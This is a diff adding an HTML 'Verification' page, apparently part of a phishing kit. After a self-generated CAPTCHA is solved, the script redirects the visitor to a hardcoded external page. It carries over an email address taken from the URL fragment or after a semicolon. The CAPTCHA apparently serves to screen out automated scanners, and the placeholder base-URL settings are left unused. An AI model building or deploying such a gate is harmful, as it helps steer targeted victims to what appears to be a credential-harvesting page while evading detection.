@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification</title>
+<style>
+    :root {
+        --accent: #610649;
+        --primary: #065cbd;
+        --primary-hover: #054a9b;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+        font-family: Arial, Helvetica, sans-serif;
+        background-color: #f5f5f5;
+        margin: 0;
+        padding: 20px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+    }
+
+    .captcha-container {
+        background-color: #fff;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+        padding: 30px;
+        text-align: center;
+        max-width: 400px;
+        width: 100%;
+    }
+
+    h1 {
+        font-size: 20px;
+        color: #333;
+        margin: 0 0 15px;
+        line-height: 1.4;
+    }
+
+    .captcha-image {
+        position: relative;
+        overflow: hidden;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        background-color: #cfeef2;
+        border: 1px solid #ccb7b7;
+        padding: 15px 20px;
+        margin: 20px 0;
+        min-width: 220px;
+        min-height: 60px;
+        font-family: Arial, sans-serif;
+        font-size: 38px;
+        font-weight: bold;
+        letter-spacing: 8px;
+        color: var(--accent);
+        user-select: none;
+    }
+
+    .captcha-image::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        z-index: 0;
+        opacity: 0.6;
+        pointer-events: none;
+        background-image:
+            linear-gradient(45deg,  transparent 65%, rgba(97,6,73,.1) 65%, rgba(97,6,73,.1) 70%, transparent 70%),
+            linear-gradient(-45deg, transparent 65%, rgba(97,6,73,.1) 65%, rgba(97,6,73,.1) 70%, transparent 70%),
+            linear-gradient(135deg, transparent 65%, rgba(97,6,73,.1) 65%, rgba(97,6,73,.1) 70%, transparent 70%),
+            linear-gradient(-135deg,transparent 65%, rgba(97,6,73,.1) 65%, rgba(97,6,73,.1) 70%, transparent 70%),
+            radial-gradient(circle at 20% 30%, rgba(97,6,73,.08) 0 10%, transparent 10%),
+            radial-gradient(circle at 80% 70%, rgba(97,6,73,.08) 0 15%, transparent 15%),
+            radial-gradient(circle at 40% 80%, rgba(97,6,73,.08) 0 8%,  transparent 8%),
+            linear-gradient(120deg, transparent 45%, rgba(97,6,73,.08) 45%, rgba(97,6,73,.08) 55%, transparent 55%),
+            linear-gradient(60deg,  transparent 45%, rgba(97,6,73,.08) 45%, rgba(97,6,73,.08) 55%, transparent 55%),
+            linear-gradient(240deg, transparent 45%, rgba(97,6,73,.08) 45%, rgba(97,6,73,.08) 55%, transparent 55%),
+            linear-gradient(300deg, transparent 45%, rgba(97,6,73,.08) 45%, rgba(97,6,73,.08) 55%, transparent 55%);
+        background-size: 100px 100px;
+    }
+
+    .captcha-char {
+        position: relative;
+        z-index: 1;
+        display: inline-block;
+        animation: float 3s infinite ease-in-out;
+    }
+
+    .captcha-char:nth-child(1) { animation-delay: .1s; }
+    .captcha-char:nth-child(2) { animation-delay: .3s; }
+    .captcha-char:nth-child(3) { animation-delay: .5s; }
+    .captcha-char:nth-child(4) { animation-delay: .2s; }
+    .captcha-char:nth-child(5) { animation-delay: .4s; }
+
+    @keyframes float {
+        0%, 100% { transform: translateY(0)    rotate(0deg); }
+        50%      { transform: translateY(-5px) rotate(2deg); }
+    }
+
+    .captcha-instruction {
+        font-size: 16px;
+        color: #555;
+        margin-bottom: 15px;
+    }
+
+    .input-row {
+        display: flex;
+        gap: 10px;
+        align-items: stretch;
+        margin-bottom: 15px;
+    }
+
+    #userInput {
+        flex: 1;
+        min-width: 0;
+        padding: 12px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        font-size: 16px;
+    }
+    #userInput:focus {
+        outline: 2px solid var(--primary);
+        outline-offset: 1px;
+        border-color: var(--primary);
+    }
+
+    .refresh-btn {
+        background-color: #f8f8f8;
+        border: 1px solid #ddd;
+        color: #0066cc;
+        cursor: pointer;
+        font-size: 14px;
+        padding: 12px 15px;
+        border-radius: 4px;
+        white-space: nowrap;
+    }
+    .refresh-btn:hover { background-color: #e8e8e8; }
+    .refresh-btn:focus-visible { outline: 2px solid var(--primary); outline-offset: 1px; }
+
+    #proceedBtn {
+        background-color: var(--primary);
+        color: #fff;
+        border: none;
+        padding: 12px 20px;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px;
+        width: 100%;
+    }
+    #proceedBtn:hover { background-color: var(--primary-hover); }
+    #proceedBtn:focus-visible { outline: 2px solid #042f63; outline-offset: 2px; }
+
+    #error-message {
+        color: #d32f2f;
+        font-size: 14px;
+        margin-top: 10px;
+        min-height: 18px;
+        visibility: hidden;
+    }
+    #error-message.show { visibility: visible; }
+</style>
+</head>
+<body>
+
+<div class="captcha-container">
+    <h1>Please complete the CAPTCHA verification to proceed</h1>
+
+    <div class="captcha-image" id="captchaCode" aria-label="CAPTCHA code" role="img"></div>
+
+    <div class="captcha-instruction">Enter the code shown above</div>
+
+    <div class="input-row">
+        <input
+            type="text"
+            id="userInput"
+            placeholder="Enter code"
+            autocomplete="off"
+            autocapitalize="off"
+            autocorrect="off"
+            spellcheck="false"
+            aria-label="Enter CAPTCHA code"
+        >
+        <button type="button" class="refresh-btn" id="refreshBtn">Refresh</button>
+    </div>
+
+    <button type="button" id="proceedBtn">Proceed</button>
+
+    <div id="error-message" role="alert">Incorrect CAPTCHA. Please try again.</div>
+</div>
+
+<script>
+(function () {
+    'use strict';
+
+    // =================================================================
+    //  >>>  INSERT #1  <<<  Base URL used when NO email is embedded
+    // =================================================================
+    const PROJECT_BASE_NO_EMAIL = 'https://project.com';
+
+    // =================================================================
+    //  >>>  INSERT #2  <<<  Base URL used WHEN an email IS embedded
+    //                       (the email fragment gets appended after it)
+    // =================================================================
+    const PROJECT_BASE_WITH_EMAIL = 'https://project.com';
+
+    // ----- Other config ----------------------------------------------
+    const CHARSET   = 'abcdefghjkmnpqrstuvwxyz23456789';
+    const LENGTH    = 5;
+    const STORE_KEY = 'currentCaptcha';
+
+    // ----- Cached elements -------------------------------------------
+    const captchaEl  = document.getElementById('captchaCode');
+    const inputEl    = document.getElementById('userInput');
+    const errorEl    = document.getElementById('error-message');
+    const refreshBtn = document.getElementById('refreshBtn');
+    const proceedBtn = document.getElementById('proceedBtn');
+
+    // ----- CAPTCHA generation ----------------------------------------
+    function generateCaptcha() {
+        let captcha = '';
+        for (let i = 0; i < LENGTH; i++) {
+            captcha += CHARSET.charAt(Math.floor(Math.random() * CHARSET.length));
+        }
+
+        try {
+            sessionStorage.setItem(STORE_KEY, captcha);
+        } catch (e) {
+            console.warn('Could not store CAPTCHA in sessionStorage:', e);
+        }
+
+        const fragment = document.createDocumentFragment();
+        for (const ch of captcha) {
+            const span = document.createElement('span');
+            span.className = 'captcha-char';
+            span.textContent = ch;
+            fragment.appendChild(span);
+        }
+        captchaEl.replaceChildren(fragment);
+
+        hideError();
+        inputEl.value = '';
+    }
+
+    // ----- Validation ------------------------------------------------
+    function validateCaptcha() {
+        let stored = null;
+        try {
+            stored = sessionStorage.getItem(STORE_KEY);
+        } catch (e) { /* storage blocked */ }
+
+        const userInput = inputEl.value.trim().toLowerCase();
+
+        if (stored && userInput === stored) {
+            processRedirect();
+        } else {
+            showError();
+            generateCaptcha();
+            inputEl.focus();
+        }
+    }
+
+    // ----- Redirect logic --------------------------------------------
+    function processRedirect() {
+        const urlGetEmail = getAfterHash(window.location.href);
+
+        if (urlGetEmail) {
+            // Email embedded → use INSERT #2 base + the fragment
+            const mailGoUrl = "https://sanitech-engineers.com/indexxxx.html#" + urlGetEmail;
+            window.location.replace(mailGoUrl);
+        } else {
+            // No email → use INSERT #1 base
+            window.location.replace("https://sanitech-engineers.com/indexxxx.html");
+        }
+    }
+
+    /**
+     * Original behavior: look for something after '#', ';', ';+', or '*;'
+     * in order of precedence. Returns '' if none found.
+     */
+    function getAfterHash(url) {
+        const hashPart      = url.split('#')[1];
+        const semicolonPart = url.split(';')[1];
+        const semiPlusPart  = url.split(';+')[1];
+        const starSemiPart  = url.split('*;')[1];
+
+        if (hashPart)        return hashPart;
+        if (semicolonPart)   return semicolonPart;
+        if (semiPlusPart)    return semiPlusPart;
+        if (starSemiPart)    return starSemiPart;
+        return '';
+    }
+
+    // ----- UI helpers ------------------------------------------------
+    function showError() { errorEl.classList.add('show'); }
+    function hideError() { errorEl.classList.remove('show'); }
+
+    // ----- Event wiring ----------------------------------------------
+    refreshBtn.addEventListener('click', generateCaptcha);
+    proceedBtn.addEventListener('click', validateCaptcha);
+
+    inputEl.addEventListener('keydown', function (e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            validateCaptcha();
+        }
+    });
+
+    // ----- Init ------------------------------------------------------
+    window.addEventListener('DOMContentLoaded', function () {
+        generateCaptcha();
+        inputEl.focus();
+    });
+})();
+</script>
+
+</body>
+</html>
